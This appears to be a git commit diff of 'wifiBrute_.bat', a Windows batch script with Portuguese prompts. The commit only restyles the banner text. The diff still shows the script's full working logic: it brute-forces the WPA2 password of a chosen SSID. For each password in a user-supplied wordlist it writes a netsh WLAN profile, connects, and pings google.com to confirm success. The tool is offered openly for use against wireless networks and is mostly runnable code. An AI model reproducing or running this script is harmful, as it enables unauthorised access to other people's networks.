70828602817cfa76ad2bcbfe4c668b47040da34f
sql3t0 <dj.sqleto@gmail.com>
2023-01-09 12:03:31 -0300

    Update wifiBrute_.bat

--- wifiBrute_.bat
+++ wifiBrute_.bat
@@ -1,14 +1,14 @@
 @ECHO off
-ECHO ------------------------------
-ECHO - WifiBruteforce (by Sql3t0) -
-ECHO ------------------------------ 
+ECHO +----------------------------+
+ECHO ^| WifiBruteforce (by Sql3t0) ^|
+ECHO +----------------------------+ 
 
 SET SENHA=None
 SET /p nome=Entre com o Nome do Ponto de Acesso (Ex: VIVO-F102): 
 SET /p lista=Entre com o nome da lista de SENHAS que sera usada (Ex: datas.txt ): 
 ECHO .
-ECHO              INFORMACOES 
-ECHO  ------------------------------------
+ECHO                       INFORMACOES
+ECHO  --------------------------------------------------------------------------------
 ECHO   SSID: %nome% ^| WORDLIST: %lista% 
 ECHO .
 
@@ -16,31 +16,31 @@ ECHO .
 FOR /F %%s IN (%lista%) do (
 
 	SET SENHA=%%s
-	ECHO [.]---------------------------
-	ECHO [^>]TESTANDO SENHA : %%s
+	ECHO [.] --------------------------------------
+	ECHO [^>] TESTANDO SENHA : %%s
 	
 	REM WPA/PSK xml file type 
 	ECHO ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^> ^<name^>%nome%^</name^> ^<SSIDConfig^> ^<SSID^> ^<name^>%nome%^</name^> ^</SSID^> ^</SSIDConfig^> ^<connectionType^>ESS^</connectionType^> ^<connectionMode^>auto^</connectionMode^> ^<MSM^> ^<security^> ^<authEncryption^> ^<authentication^>WPA2PSK^</authentication^> ^<encryption^>AES^</encryption^> ^<useOneX^>false^</useOneX^> ^</authEncryption^> ^<sharedKey^> ^<keyType^>passPhrase^</keyType^> ^<protected^>false^</protected^> ^<keyMaterial^> %%s ^</keyMaterial^> ^</sharedKey^> ^</security^> ^</MSM^> ^</WLANProfile^> > %nome%.xml
 	
-	ECHO [^>]Desconectando rede...
+	ECHO [^>] Desconectando rede...
 	REM netsh wlan disconnect > NULL
 	netsh wlan disconnect
 	
-	ECHO [^>]Adicionando novo PROFILE : %nome% 
+	ECHO [^>] Adicionando novo PROFILE : %nome% 
 	REM netsh wlan add profile filename=%nome%.xml user=all
 	netsh wlan add profile filename=%nome%.xml user=all > NULL
 
-	ECHO [^>]Conectando com a REDE : %nome%
+	ECHO [^>] Conectando com a REDE : %nome%
 	REM netsh wlan connect ssid=%nome% name=%nome%
 	netsh wlan connect ssid=%nome% name=%nome% > NULL
 	
-	ECHO [^>]TESTANDO CONEXAO...
+	ECHO [^>] TESTANDO CONEXAO...
 	for /L %%p in (0,1,30) do (  
 		REM ping google.com 
 		ping -n 3 google.com 2> NULL | FINDSTR "Resposta de"
 		if not errorlevel 1 goto senhaOK
 	)
-	ECHO [ ]---------------------------
+	ECHO [.] --------------------------------------
 	ECHO [-]
 )
 
